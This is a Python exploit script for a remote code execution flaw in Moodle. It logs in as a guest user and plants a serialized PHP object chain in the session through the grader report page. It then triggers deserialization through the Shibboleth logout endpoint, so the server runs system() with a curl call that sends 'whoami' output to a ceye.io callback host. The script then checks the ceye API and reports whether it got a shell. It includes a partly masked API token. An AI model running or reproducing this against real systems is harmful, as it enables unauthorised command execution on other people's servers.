# coding: utf8
import requests
import sys
import re

def run(url):
    ceye_rawurl = "xxxxx.ceye.io"
    ceye_token = "xxxxxxx9135d02bb2a9461b6b8d201"
    flag = url.replace("http://","").replace("https://","").replace(":","").replace("/","").replace("-","")
    if len(flag) > 20:
        flag = flag[:20]
    else:
        length = 20 - len(flag)
        flag += length*'a'

    r = requests.session()
    login_url = url + "/login/index.php"
    html = r.get(login_url).text
    logintoken = re.findall('<input type="hidden" name="logintoken" value="(.*?)">', html)[0]
    print("[*] get logintoken " + logintoken)
    data1 = {
        "logintoken": logintoken,
        "username": "guest",
        "password": "guest"
    }
    r.post(login_url, data=data1)
    print("[*] login by guest")
    data2 = {
        "id": 1,
        "sifirst": 'Testaaaaa|a:2:{i:0;O:22:"core_question_external":0:{}i:1;O:14:"core\lock\lock":1:{s:3:"key";O:22:"core_availability\\tree":1:{s:8:"children";O:23:"core\dml\\recordset_walk":3:{s:9:"recordset";O:25:"question_attempt_iterator":2:{s:5:"slots";a:1:{s:3:"xxx";s:3:"key";}s:4:"quba";O:26:"question_usage_by_activity":1:{s:16:"questionattempts";a:1:{s:3:"key";s:56:"curl http://aaaaaaaaaaaaaaaaaaaa.'.replace("aaaaaaaaaaaaaaaaaaaa",flag) + ceye_rawurl + '/`whoami`";}}}s:13:"callbackextra";N;s:8:"callback";s:6:"system";}}}}Testbbbbbb|'
    }
    write_url = url + "/grade/report/grader/index.php"
    r.post(write_url, data=data2)
    print("[*] write payload to session")
    data3 = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
    <LogoutNotification><SessionID>ssss</SessionID>
    </LogoutNotification></s:Body></s:Envelope>'''

    rce_url = url + "/auth/shibboleth/logout.php"
    requests.post(rce_url, data=data3)
    print("[*] start to unserialize session")

    ceye_url = "http://api.ceye.io/v1/records?token=" + ceye_token + "&type=http&filter=" + flag
    rsp = requests.get(ceye_url, timeout=30).json()
    if len(rsp["data"]) > 0:
        print("[+] you get shell")
    else:
        print("[-] target is not vulnerable")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("[!] Usage: python3 moodle_rce.py http://x.x.x.x")
        exit(0)
    url = sys.argv[1]
    run(url)
